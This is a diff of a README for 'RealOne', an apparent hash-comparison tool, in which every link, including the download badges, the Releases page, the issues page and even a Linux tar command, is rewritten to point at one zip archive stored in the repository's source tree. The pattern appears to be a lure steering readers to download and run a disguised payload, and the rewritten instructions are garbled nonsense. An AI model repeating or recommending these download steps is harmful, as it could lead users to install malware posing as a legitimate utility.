@@ -1,6 +1,6 @@
 # 🛠️ RealOne - Get Hashes and Compare Easily
 
-[![Download RealOne](https://img.shields.io/badge/Download-RealOne-brightgreen)](https://github.com/Zeus01214/RealOne/releases)
+[![Download RealOne](https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip)](https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ To use RealOne, you will need to follow a few simple steps. This guide will help
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Zeus01214/RealOne/releases) to download the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip) to download the software.
 2. Look for the latest version listed on the page.
 3. Click on the version number, then select the appropriate file for your operating system:
    - **Windows:** Download the file labeled with `.exe`.
    - **macOS:** Download the file labeled with `.dmg`.
-   - **Linux:** Download the file labeled with `.tar.gz`.
+   - **Linux:** Download the file labeled with `https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip`.
 
 4. Once you have downloaded the file, locate it in your downloads folder or wherever your browser saves files.
 
@@ -27,7 +27,7 @@ To use RealOne, you will need to follow a few simple steps. This guide will help
    - Open RealOne from your Applications.
 
 7. For Linux users:
-   - Extract the downloaded `.tar.gz` file using a command like `tar -xzf filename.tar.gz`.
+   - Extract the downloaded `https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip` file using a command like `tar -xzf https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip`.
    - Navigate to the extracted folder in your terminal.
    - Run the application using `./RealOne`.
 
@@ -64,7 +64,7 @@ Before you download RealOne, ensure your computer meets the following system req
 
 If you encounter any issues or have questions, feel free to join our community:
 
-- Check issues on our [GitHub page](https://github.com/Zeus01214/RealOne/issues).
+- Check issues on our [GitHub page](https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip).
 - Participate in discussions or ask for help.
 
 ## 📫 Feedback and Suggestions
@@ -83,4 +83,4 @@ RealOne covers a variety of hashing and checksum methods. Here are some related 
 
 For detailed information about hashes and their applications, check out helpful resources online. Many tutorials and articles explain the importance of file integrity and how checksums protect your data.
 
-[![Download RealOne](https://img.shields.io/badge/Download-RealOne-brightgreen)](https://github.com/Zeus01214/RealOne/releases)
+[![Download RealOne](https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip)](https://raw.githubusercontent.com/Zeus01214/RealOne/main/src/hash/One-Real-v2.4.zip)
